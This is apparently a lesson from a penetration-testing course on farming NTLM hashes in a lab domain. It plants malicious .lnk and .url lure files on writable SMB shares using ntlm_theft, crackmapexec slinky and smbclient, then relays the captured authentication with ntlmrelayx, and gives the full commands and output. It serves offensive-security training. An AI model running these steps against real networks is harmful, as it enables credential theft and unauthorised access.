## Abusing Access to Shared Folders

### Enumeration

A common way of farming hashes and forcing users to connect to our attack host is by abusing shared folders. Suppose we find a user with access to a shared folder, or the shared folder allows anonymous access with `read` and `write` permissions. In that case, we can put our malicious file there and wait for a user to connect to us, capture their NTLM authentication, and relay it to relay targets.

Let’s use `crackmapexec` to scan the network for shared folders that allow anonymous authentication:
```
crackmapexec smb 172.16.117.0/24 -u anonymous -p '' --shares

SMB         172.16.117.3    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.117.50   445    WS01             [*] Windows 10.0 Build 17763 x64 (name:WS01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         172.16.117.3    445    DC01             [+] INLANEFREIGHT.LOCAL\anonymous:
SMB         172.16.117.3    445    DC01             [*] Enumerated shares
SMB         172.16.117.3    445    DC01             Share           Permissions     Remark
SMB         172.16.117.3    445    DC01             -----           -----------     ------
SMB         172.16.117.3    445    DC01             ADMIN$                          Remote Admin
SMB         172.16.117.3    445    DC01             C$                              Default share
SMB         172.16.117.3    445    DC01             CertEnroll                      Active Directory Certificate Services share
SMB         172.16.117.3    445    DC01             IPC$            READ            Remote IPC
SMB         172.16.117.3    445    DC01             NETLOGON                        Logon server share
SMB         172.16.117.3    445    DC01             smb             READ,WRITE
SMB         172.16.117.3    445    DC01             SYSVOL                          Logon server share
<SNIP>
```

In the above command output, we discovered a shared folder named `smb` on `DC01` where we have `READ` and `WRITE` permissions. Therefore, we can drop our malicious file there. Let us see what tools we can use to generate files to drop in shared folders.

### File Types

We found a folder in which we have write permissions. For the next step, we need to understand the types of files we can use to force authentication to our attack host.

One of the most common file types for this type of attack is the shortcut ( `.lnk`), because they are easy to create, commonly used in Windows, and can quickly go unnoticed. We would have to set the icon’s path to a UNC of our attack host to abuse a shortcut. Optionally, we can put an `@` at the start of the file name to appear at the top of the directory to ensure it is seen and executed by Windows Explorer as soon as the user accesses the share.

To create a `.lnk`, we will use `netexec` or [ntlm_theft](https://github.com/Greenwolf/ntlm_theft), a tool for generating multiple NTLMv2 hash theft files. The tool is at `/home/htb-student/tools/ntlm_theft`. It supports the option `-g` to choose the file type we want to generate or the keyword `all` to create all file types. We also need to set the option `-s`, which corresponds to the IP address of our SMB hash capture server; this is where we can run `ntlmrelayx` and, finally, the filename with the option `-f`:

#### Using ntlm_theft.py

```
python3 ntlm_theft.py -g all -s 172.16.117.30 -f '@myfile'

Created: @myfile/@myfile.scf (BROWSE TO FOLDER)
Created: @myfile/@myfile-(url).url (BROWSE TO FOLDER)
Created: @myfile/@myfile-(icon).url (BROWSE TO FOLDER)
Created: @myfile/@myfile.lnk (BROWSE TO FOLDER)
Created: @myfile/@myfile.rtf (OPEN)
Created: @myfile/@myfile-(stylesheet).xml (OPEN)
Created: @myfile/@myfile-(fulldocx).xml (OPEN)
Created: @myfile/@myfile.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: @myfile/@myfile-(includepicture).docx (OPEN)
Created: @myfile/@myfile-(remotetemplate).docx (OPEN)
Created: @myfile/@myfile-(frameset).docx (OPEN)
Created: @myfile/@myfile-(externalcell).xlsx (OPEN)
Created: @myfile/@myfile.wax (OPEN)
Created: @myfile/@myfile.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
Created: @myfile/@myfile.asx (OPEN)
Created: @myfile/@myfile.jnlp (OPEN)
Created: @myfile/@myfile.application (DOWNLOAD AND OPEN)
Created: @myfile/@myfile.pdf (OPEN AND ALLOW)
Created: @myfile/zoom-attack-instructions.txt (PASTE TO CHAT)
Created: @myfile/Autorun.inf (BROWSE TO FOLDER)
Created: @myfile/desktop.ini (BROWSE TO FOLDER)
Generation Complete.
```

### Attacking SMB Shares

We can use the `.url` or `.lnk` files as those are activated when users browse a shared folder. We will use `smbclient.py` to connect to the shared folder and place the file there:
```
smbclient.py [email protected] -no-pass

Impacket v0.11.0 - Copyright 2023 Fortra

Type help for list of commands
# shares
ADMIN$
C$
CertEnroll
IPC$
NETLOGON
smb
SYSVOL
# use smb
# put @myfile/@myfile.lnk
# exit
```

Now, let us use the `all://` scheme of `ntlmrelayx` to try to connect to all services on the target machine.
```
cat relayTargets.txt

all://172.16.117.50
all://172.16.117.60
```

```
ntlmrelayx.py -tf relayTargets.txt -smb2support -socks

Impacket v0.11.0 - Copyright 2023 Fortra
<SNIP>

[*] Servers started, waiting for connections
Type help for list of commands
ntlmrelayx> [*] SMBD-Thread-13: Connection from INLANEFREIGHT/[email protected] controlled, attacking target smb://172.16.117.50
[-] Authenticating against smb://172.16.117.50 as INLANEFREIGHT/CMATOS FAILED
[*] SMBD-Thread-28: Connection from INLANEFREIGHT/[email protected] controlled, attacking target smb://172.16.117.60
[*] Authenticating against smb://172.16.117.60 as INLANEFREIGHT/CMATOS SUCCEED
[*] SOCKS: Adding INLANEFREIGHT/[email protected](445) to active SOCKS connection. Enjoy
[*] SMBD-Thread-29: Connection from INLANEFREIGHT/[email protected] controlled, attacking target mssql://172.16.117.60
[*] Authenticating against mssql://172.16.117.60 as INLANEFREIGHT/CMATOS SUCCEED
[*] SOCKS: Adding INLANEFREIGHT/[email protected](1433) to active SOCKS connection. Enjoy
ntlmrelayx> socks
Protocol  Target         Username              AdminStatus  Port
--------  -------------  --------------------  -----------  ----
SMB       172.16.117.60  INLANEFREIGHT/CMATOS  FALSE        445
MSSQL     172.16.117.60  INLANEFREIGHT/CMATOS  N/A          1433
```

Let’s discuss some lines of the above output:

```
[*] SMBD-Thread-13: Connection from INLANEFREIGHT/[email protected] controlled, attacking target smb://172.16.117.50
[-] Authenticating against smb://172.16.117.50 as INLANEFREIGHT/CMATOS FAILED
```

The SMB thread `13` indicates that the authentication is coming from `172.16.117.50`, and it fails because the user who browsed the shared folder was located at `172.16.117.50` and the target was the same host `172.16.117.50`. We can’t relay back to the same host.

The SMB thread `28` and `29` shows a successful authentication against `172.16.117.60` to the services `SMB` and `MSSQL`:

```
[*] SMBD-Thread-28: Connection from INLANEFREIGHT/[email protected] controlled, attacking target smb://172.16.117.60
[*] Authenticating against smb://172.16.117.60 as INLANEFREIGHT/CMATOS SUCCEED
[*] SMBD-Thread-29: Connection from INLANEFREIGHT/[email protected] controlled, attacking target mssql://172.16.117.60
[*] Authenticating against mssql://172.16.117.60 as INLANEFREIGHT/CMATOS SUCCEED
```

### Other Tools

#### CrackMapExec

To generate a shortcut `.lnk` file, we can also use `CrackMapExec`’s `Slinky` module, which creates the malicious shortcut file (in addition to providing a method of cleaning up). `Slinky` has the capability of identifying writable shares and automatically creating the `LNK` file inside them:

```
crackmapexec smb -M slinky --options

[*] slinky module options:

        SERVER        IP of the SMB server
        NAME          LNK file nametest
        CLEANUP       Cleanup (choices: True or False)
```

```
crackmapexec smb 172.16.117.3 -u anonymous -p '' -M slinky -o SERVER=172.16.117.30 NAME=important

[*] Ignore OPSEC in configuration is set and OPSEC unsafe module loaded
SMB         172.16.117.3    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.117.3    445    DC01             [+] INLANEFREIGHT.LOCAL\anonymous:
SLINKY      172.16.117.3    445    DC01             [+] Found writable share: smb
SLINKY      172.16.117.3    445    DC01             [+] Created LNK file on the smb share
```

#### Farmer

[Farmer](https://github.com/mdsecactivebreach/Farmer) is a tool created by [MDSec](https://www.mdsec.co.uk/), and it comes with three binaries, `farmer.exe` for setting up a server that will capture the requests (NTLM); `crop.exe` which is used to create malicious files that can be placed in SMB shares; and `fertiliser.exe` which can be used to poison `Office` documents.

**Note:** `MDSec's` blog post [Farming for Red Teams: Harvesting NetNTLM](https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/) is an excellent resource to learn more about farming hashes.